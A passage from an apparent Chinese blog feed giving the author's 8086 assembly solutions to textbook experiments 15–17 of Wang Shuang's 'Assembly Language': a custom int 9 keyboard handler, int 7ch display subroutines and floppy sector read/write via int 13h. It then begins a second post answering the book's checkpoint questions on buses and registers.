class="string">'\'</span></div><div class="line">add di, 2</div><div class="line">jmp next</div><div class="line"></div><div class="line">colon:  mov byte ptr es:[di], ':<span class="string">'</span></div><div class="line">add di, 2</div><div class="line">jmp next</div><div class="line"></div><div class="line">space:  mov byte ptr es:[di], ' <span class="string">'</span></div><div class="line">add di, 2</div><div class="line">jmp next</div><div class="line"></div><div class="line">code ends</div><div class="line"></div><div class="line">end start</div></pre></td></tr></table></figure></p>
<h2 id="实验15-安装新的int-9中断例程"><a href="#实验15-安装新的int-9中断例程" class="headerlink" title="实验15 安装新的int 9中断例程"></a>实验15 安装新的int 9中断例程</h2><p>安装一个新的int 9中断例程，功能：在DOS下，按下’A’键后，除非不再松开，如果松开，就显示满屏幕的’A’；其他键照常处理。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line"></div><div class="line">stack <span class="meta">segment</span></div><div class="line"><span class="built_in">db</span> <span class="number">128</span> dup (<span class="number">0</span>)</div><div class="line">stack ends</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, stack</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">128</span></div><div class="line"></div><div class="line"><span class="keyword">push</span> <span class="built_in">cs</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ds</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset int9</div><div class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">204h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, offset int9end - offset int9</div><div class="line"><span class="keyword">cld</span></div><div class="line"><span class="keyword">rep</span> <span class="keyword">movsb</span></div><div class="line"></div><div class="line"><span class="keyword">push</span> <span class="built_in">es</span>: [<span class="number">9</span> * <span class="number">4</span>]</div><div class="line"><span class="keyword">pop</span> <span class="built_in">es</span>: [<span class="number">200h</span>]</div><div class="line"><span class="keyword">push</span> <span class="built_in">es</span>: [<span class="number">9</span> * <span class="number">4</span> + <span class="number">2</span>]</div><div class="line"><span class="keyword">pop</span> <span class="built_in">es</span>: [<span class="number">202h</span>]</div><div class="line"></div><div class="line"><span class="keyword">cli</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>: [<span class="number">9</span> * <span class="number">4</span>], <span class="number">204h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>: [<span class="number">9</span> * <span class="number">4</span> + <span class="number">2</span>], <span class="number">0</span></div><div class="line"><span class="keyword">sti</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line"><span class="symbol"></span></div><div class="line">int9:   <span class="keyword">push</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">es</span></div><div class="line"></div><div class="line"><span class="keyword">in</span> <span class="built_in">al</span>, <span class="number">60h</span></div><div class="line"></div><div class="line"><span class="keyword">pushf</span></div><div class="line"><span class="keyword">call</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">cs</span>:[<span class="number">200h</span>]</div><div class="line"></div><div class="line"><span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">9eh</span></div><div class="line"><span class="keyword">jne</span> int9ret</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0b800h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">2000</span></div><div class="line"><span class="symbol">s:</span>      <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="string">'A'</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></div><div class="line"><span class="keyword">loop</span> s</div><div class="line"><span class="symbol"></span></div><div class="line">int9ret:<span class="keyword">pop</span> <span class="built_in">es</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">iret</span></div><div class="line"><span class="symbol"></span></div><div class="line">int9end:<span class="keyword">nop</span></div><div class="line"></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure></p>
<h2 id="实验16-编写包含多个功能子程序的中断例程"><a href="#实验16-编写包含多个功能子程序的中断例程" class="headerlink" title="实验16 编写包含多个功能子程序的中断例程"></a>实验16 编写包含多个功能子程序的中断例程</h2><p>安装一个新的int  7ch中断例程，为显示输出提供如下功能子程序</p>
<ol>
<li>清屏</li>
<li>设置前景色</li>
<li>设置背景色</li>
<li>向上滚动一行</li>
</ol>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset screen</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">200h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, offset screenend - offset screen</div><div class="line"><span class="keyword">cld</span></div><div class="line"><span class="keyword">rep</span> <span class="keyword">movsb</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span>], <span class="number">200h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span> + <span class="number">2</span>], <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line"><span class="symbol"></span></div><div class="line">screen: <span class="keyword">jmp</span> short set</div><div class="line"><span class="comment">;考虑到安装中断例程后偏移地址发生了变化，需要重新计算相关的偏移地址</span></div><div class="line">table   <span class="built_in">dw</span> offset sub1 - offset screen + <span class="number">200h</span>, offset sub2 - offset screen + <span class="number">200h</span>, offset sub3 - offset screen + <span class="number">200h</span>, offset sub4 - offset screen + <span class="number">200h</span></div><div class="line"><span class="symbol"></span></div><div class="line">set:    <span class="keyword">push</span> <span class="built_in">bx</span></div><div class="line"></div><div class="line"><span class="keyword">cmp</span> <span class="number">ah</span>, <span class="number">3</span></div><div class="line"><span class="keyword">ja</span> sret</div><div class="line"><span class="keyword">mov</span> <span class="built_in">bl</span>, <span class="number">ah</span></div><div class="line"><span class="keyword">mov</span> <span class="number">bh</span>, <span class="number">0</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="built_in">bx</span></div><div class="line"></div><div class="line"><span class="comment">;同上</span></div><div class="line"><span class="keyword">call</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">cs</span>:(table - screen + <span class="number">200h</span>)[<span class="built_in">bx</span>]</div><div class="line"><span class="symbol"></span></div><div class="line">sret:   <span class="keyword">pop</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">iret</span></div><div class="line"><span class="symbol"></span></div><div class="line">sub1:   <span class="keyword">push</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">es</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0b800h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">bx</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">2000</span></div><div class="line"><span class="symbol">sub1s:</span>  <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="string">' '</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></div><div class="line"><span class="keyword">loop</span> sub1s</div><div class="line"><span class="keyword">pop</span> <span class="built_in">es</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">ret</span></div><div class="line"><span class="symbol"></span></div><div class="line">sub2:   <span class="keyword">push</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">es</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0b800h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">bx</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">1</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">2000</span></div><div class="line"><span class="symbol">sub2s:</span>  <span class="keyword">and</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="number">11111000B</span></div><div class="line"><span class="keyword">or</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="built_in">al</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></div><div class="line"><span class="keyword">loop</span> sub2s</div><div class="line"></div><div class="line"><span class="keyword">pop</span> <span class="built_in">es</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">ret</span></div><div class="line"><span class="symbol"></span></div><div class="line">sub3:   <span class="keyword">push</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">es</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="number">4</span></div><div class="line"><span class="keyword">shl</span> <span class="built_in">al</span>, <span class="built_in">cl</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0b800h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">bx</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">1</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">2000</span></div><div class="line"><span class="symbol">sub3s:</span>  <span class="keyword">and</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="number">10001111B</span></div><div class="line"><span class="keyword">or</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>], <span class="built_in">al</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></div><div class="line"><span class="keyword">loop</span> sub3s</div><div class="line"><span class="keyword">pop</span> <span class="built_in">es</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">ret</span></div><div class="line"><span class="symbol"></span></div><div class="line">sub4:   <span class="keyword">push</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">di</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">es</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ds</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0b800h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">si</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">si</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">160</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">0</span></div><div class="line"><span class="keyword">cld</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">24</span></div><div class="line"><span class="symbol">sub4s:</span>  <span class="keyword">push</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">160</span></div><div class="line"><span class="keyword">rep</span> <span class="keyword">movsb</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">loop</span> sub4s</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">80</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></div><div class="line"><span class="symbol">sub4s1:</span> <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="number">160</span>*<span class="number">24</span>+<span class="built_in">si</span>], <span class="string">' '</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">si</span>, <span class="number">2</span></div><div class="line"><span class="keyword">loop</span> sub4s1</div><div class="line"></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ds</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">es</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">di</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">ret</span></div><div class="line"><span class="symbol"></span></div><div class="line">screenend:</div><div class="line"><span class="keyword">nop</span></div><div class="line"></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure>
<p>参考<a href="http://blog.csdn.net/lixiang0522/article/details/8434450" target="_blank" rel="external">王爽《汇编语言》实验16：包含多个功能子程序的中断例程 解答</a><br>可以用伪指令org x简化该程序<br>org x表明接下来的指令从偏移地址x开始<br>修改后的相关指令如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">org <span class="number">200h</span></div><div class="line"><span class="symbol">screen:</span> <span class="keyword">jmp</span> short set</div><div class="line"></div><div class="line">table   <span class="built_in">dw</span> sub1, sub2, sub3, sub4</div><div class="line"><span class="symbol"></span></div><div class="line">set:    <span class="keyword">push</span> <span class="built_in">bx</span></div><div class="line"></div><div class="line"><span class="keyword">cmp</span> <span class="number">ah</span>, <span class="number">3</span></div><div class="line"><span class="keyword">ja</span> sret</div><div class="line"><span class="keyword">mov</span> <span class="built_in">bl</span>, <span class="number">ah</span></div><div class="line"><span class="keyword">mov</span> <span class="number">bh</span>, <span class="number">0</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="built_in">bx</span></div><div class="line"></div><div class="line"><span class="keyword">call</span> <span class="built_in">word</span> <span class="built_in">ptr</span> table[<span class="built_in">bx</span>]</div></pre></td></tr></table></figure></p>
<h2 id="实验17-编写包含多个功能子程序的中断例程"><a href="#实验17-编写包含多个功能子程序的中断例程" class="headerlink" title="实验17 编写包含多个功能子程序的中断例程"></a>实验17 编写包含多个功能子程序的中断例程</h2><p>安装一个新的int 7ch中断例程，实现通过逻辑扇区号对软盘进行读写。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset floppyio</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">200h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, offset floppyioend - offset floppyio</div><div class="line"><span class="keyword">cld</span></div><div class="line"><span class="keyword">rep</span> <span class="keyword">movsb</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span>], <span class="number">200h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span> + <span class="number">2</span>], <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line"><span class="symbol"></span></div><div class="line">floppyio:</div><div class="line"><span class="keyword">push</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">dx</span></div><div class="line"></div><div class="line"><span class="keyword">add</span> <span class="number">ah</span>, <span class="number">2</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">1</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ax</span> <span class="comment">;计算相应的ah和al并压栈</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">dx</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">1440</span></div><div class="line"><span class="keyword">div</span> <span class="built_in">cx</span> <span class="comment">;计算逻辑扇区号/1440</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ax</span> <span class="comment">;将商即面号压栈</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">dx</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">dl</span>, <span class="number">18</span></div><div class="line"><span class="keyword">div</span> <span class="built_in">dl</span> <span class="comment">;计算逻辑扇区号/1440的余数/18</span></div><div class="line"><span class="keyword">inc</span> <span class="number">ah</span></div><div class="line"><span class="keyword">mov</span> <span class="number">ch</span>, <span class="built_in">al</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="number">ah</span> <span class="comment">;设置相应的ch和cl</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ax</span> <span class="comment">;将相应的面号出栈</span></div><div class="line"><span class="keyword">mov</span> <span class="number">dh</span>, <span class="built_in">al</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">dl</span>, <span class="number">0</span> <span class="comment">;设置相应的dh和dl</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ax</span> <span class="comment">;将相应的ah和al出栈</span></div><div class="line"><span class="keyword">int</span> <span class="number">13h</span> <span class="comment">;调用13h例程进行实际的读写</span></div><div class="line"></div><div class="line"><span class="keyword">pop</span> <span class="built_in">dx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">iret</span></div><div class="line"><span class="symbol">floppyioend:</span></div><div class="line"><span class="keyword">nop</span></div><div class="line"></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;开学三周，王爽的《汇编语言》（第三版）总算是基本上看完了，本文是总结的第二部分，包括了书本上的实验&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;实验1-查看CPU和内存，用机器指令和汇编指令编程&quot;&gt;&lt;a href=&quot;#实验1-查看CPU和内
    
    </summary>
    
      <category term="汇编" scheme="http://blog.codedragon.tech/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="实验" scheme="http://blog.codedragon.tech/tags/%E5%AE%9E%E9%AA%8C/"/>
    
      <category term="汇编" scheme="http://blog.codedragon.tech/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>王爽汇编语言第三版检测点答案</title>
    <link href="http://blog.codedragon.tech/2017/03/05/%E7%8E%8B%E7%88%BD%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AC%AC%E4%B8%89%E7%89%88%E6%A3%80%E6%B5%8B%E7%82%B9%E7%AD%94%E6%A1%88/"/>
    <id>http://blog.codedragon.tech/2017/03/05/王爽汇编语言第三版检测点答案/</id>
    <published>2017-03-05T10:49:39.000Z</published>
    <updated>2017-04-08T11:01:16.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>开学三周，王爽的《汇编语言》（第三版）总算是基本上看完了，本文是总结的第一部分，包括了书上所有的检测点答案</p>
</blockquote>
<h2 id="第一章-基础知识"><a href="#第一章-基础知识" class="headerlink" title="第一章 基础知识"></a>第一章 基础知识</h2><h3 id="检测点-1-1"><a href="#检测点-1-1" class="headerlink" title="检测点 1.1"></a>检测点 1.1</h3><ol>
<li>1个CPU的寻址能力为8KB，那么它的地址总线的宽度为____。<br> <strong>13</strong><br> 解析：CPU在内存中寻址的最小单位是Byte（字节），8KB = 2^13B，因此地址总线的宽度为13.</li>
<li>1KB的存储器有____个存储单元。存储单元的编号从____到____。<br> <strong>1024    0    1023</strong></li>
<li>1KB的存储器可以存储____个bit，____个Byte。<br> <strong>2^13    2^10</strong></li>
<li>1GB、1MB、1KB分别是____________Byte<br> <strong>2^30    2^20    2^10</strong></li>
<li>8080、8088、80286、80386的地址总线宽度分别为16根、20根、24根、32根，则他们的寻址能力分别为____（KB）、____（MB）、____（MB）、____（GB）。<br> <strong>64    1    16    4</strong></li>
<li>8080、8088、8086、80286、80386的数据总线宽度分别为8根、8根、16根、16根、32根。则它们一次可以传送的数据为：____（B）、____（B）、____（B）、____（B）、____（B）。<br> <strong>1    1    2    2    4</strong></li>
<li>从内存中读取1024字节的数据，8086至少要读取____次，80386至少要读取____次。<br> <strong>512    256</strong></li>
<li>在存储器中，数据和程序以____形式存放。<br> <strong>二进制</strong></li>
</ol>
<h2 id="第二章-寄存器"><a href="#第二章-寄存器" class="headerlink" title="第二章 寄存器"></a>第二章 寄存器</h2><h3 id="检测点-2-1"><a href="#检测点-2-1" class="headerlink" title="检测点 2.1"></a>检测点 2.1</h3><ol>
<li>写出每条汇编指令执行后相关寄存器中的值 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">62627</span>		<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">31H</span>		<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">23H</span>		<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">ax</span>		<span class="built_in">AX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">826CH</span>		<span class="built_in">BX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="built_in">ax</span>		<span class="built_in">CX</span> =</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">bx</span>		<span 